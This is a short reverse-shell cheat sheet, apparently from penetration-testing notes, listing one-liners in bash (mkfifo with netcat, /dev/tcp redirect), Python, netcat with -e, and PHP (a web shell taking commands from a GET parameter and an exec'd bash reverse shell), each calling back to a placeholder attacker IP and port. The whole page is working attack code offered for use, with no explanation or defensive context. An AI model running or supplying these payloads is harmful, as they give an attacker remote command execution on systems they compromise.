# Reverse Shell

{% code overflow="wrap" %}
```bash
# BASH
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP_ADDR] [PORT] >/tmp/f
echo "bash -i >& /dev/tcp/[IP_ADDR]/[PORT] 0>&1"

# PYTHON ONE LINER
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[IP_ADDR]',[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-I']);"

# NetCat
nc [IP_ADDR] [PORT] -e /bin/bash
```
{% endcode %}

## PHP

```php
<? php echo "<pre>"; system($_GET['cmd']); ?>
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/[IP_ADDR]/[PORT] 0>&1'"); ?>
```
